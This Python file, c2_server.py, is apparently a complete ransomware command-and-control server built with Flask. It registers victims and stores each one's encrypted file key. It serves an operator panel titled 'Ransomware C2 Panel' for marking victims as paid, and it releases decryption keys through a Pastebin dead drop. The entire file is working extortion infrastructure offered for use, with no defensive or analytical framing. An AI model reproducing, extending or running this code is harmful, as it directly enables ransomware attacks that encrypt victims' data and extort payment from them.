# c2_server.py
import os
import uuid
from flask import Flask, request, jsonify, render_template_string
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import base64
import requests

# --- Configuration ---
PRIVATE_KEY_FILE = "private_key.pem"
# CHANGE THIS TO YOUR PASTEBIN URL
DEAD_DROP_URL = "https://pastebin.com/raw/YOUR_PASTE_ID_HERE" 

# --- Database (In-memory for simplicity) ---
victims = {} # { 'victim_id': {'status': 'UNPAID', 'aes_key_b64': '...'} }

# --- Load Master Private Key ---
def load_private_key():
    if not os.path.exists(PRIVATE_KEY_FILE):
        print(f"[-] ERROR: {PRIVATE_KEY_FILE} not found. Please run Key Generation step first.")
        return None
        
    with open(PRIVATE_KEY_FILE, "rb") as key_file:
        return serialization.load_pem_private_key(
            key_file.read(),
            password=None,
        )

master_private_key = None # load on startup

# --- Flask App ---
app = Flask(__name__)

# HTML Template for the Attacker's Web Interface
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Ransomware C2 Panel</title>
    <style>body { font-family: sans-serif; background: #222; color: #eee; } table { width: 100%; border-collapse: collapse; } th, td { border: 1px solid #555; padding: 8px; text-align: left; } th { background: #333; } .paid { color: #4CAF50; } .unpaid { color: #f44336; } button { background-color: #008CBA; color: white; padding: 5px 10px; border: none; cursor: pointer; } button:disabled { background-color: #555; cursor: not-allowed; }</style>
</head>
<body>
    <h1>C2 Victim Management</h1>
    <table>
        <tr>
            <th>Victim ID</th>
            <th>Status</th>
            <th>Action</th>
        </tr>
        {% for victim_id, data in victims.items() %}
        <tr>
            <td>{{ victim_id }}</td>
            <td class="{{ 'paid' if data.status == 'PAID' or data.status == 'KEY_SENT' else 'unpaid' }}">
                {{ data.status }}
            </td>
            <td>
                <form action="/mark_paid" method="post" style="display:inline;">
                    <input type="hidden" name="victim_id" value="{{ victim_id }}">
                    <button {% if data.status != 'UNPAID' %}disabled{% endif %}>Mark as Paid</button>
                </form>
            </td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, victims=victims)

@app.route('/checkin', methods=['POST'])
def checkin():
    victim_id = str(uuid.uuid4())
    aes_key_b64 = request.json.get('aes_key_b64')

    if not aes_key_b64:
        return jsonify({"error": "AES key not provided"}), 400

    victims[victim_id] = {
        'status': 'UNPAID',
        'aes_key_b64': aes_key_b64
    }
    print(f"[+] New victim checked in: {victim_id}")
    return jsonify({"victim_id": victim_id})

@app.route('/status/<victim_id>')
def status(victim_id):
    victim = victims.get(victim_id)
    if not victim:
        return jsonify({"error": "Victim not found"}), 404
    return jsonify({"status": victim['status']})

@app.route('/mark_paid', methods=['POST'])
def mark_paid():
    victim_id = request.form.get('victim_id')
    victim = victims.get(victim_id)

    if not victim or victim['status'] != 'UNPAID':
        return "Invalid victim or status", 400

    # 1. Update status
    victim['status'] = 'KEY_SENT'
    print(f"[*] Marking victim {victim_id} as paid. Sending key...")

    if not master_private_key:
        return "Server Error: Private Key not loaded", 500

    # 2. Decrypt the victim's AES key with the master private key
    try:
        encrypted_aes_key = base64.b64decode(victim['aes_key_b64'])
        aes_key = master_private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        aes_key_b64_for_victim = base64.b64encode(aes_key).decode('utf-8')
    except Exception as e:
        print(f"[-] Error decrypting AES key for {victim_id}: {e}")
        return "Failed to decrypt key", 500

    # 3. Post the decrypted AES key to the dead drop
    try:
        # This is a simplified example. A real system would use Pastebin's API.
        # For this demo, you will manually update the Pastebin.
        print(f"[*] DECRYPTION TOKEN for {victim_id}: {aes_key_b64_for_victim}")
        print(f"[*] Manually post this token to your Pastebin URL: {DEAD_DROP_URL}")
        # In a real scenario, you would use requests.post() to an API endpoint here.
        
    except Exception as e:
        print(f"[-] Error posting to dead drop: {e}")
        return "Failed to post key", 500
        
    return "Key sent successfully", 200

if __name__ == '__main__':
    # Load key on startup
    try:
        master_private_key = load_private_key()
        if master_private_key:
            print("[+] Private key loaded successfully.")
            app.run(host='0.0.0.0', port=5000, debug=True)
        else:
             print("[-] Please generate keys first.")
    except Exception as e:
        print(f"[-] Error loading key: {e}")
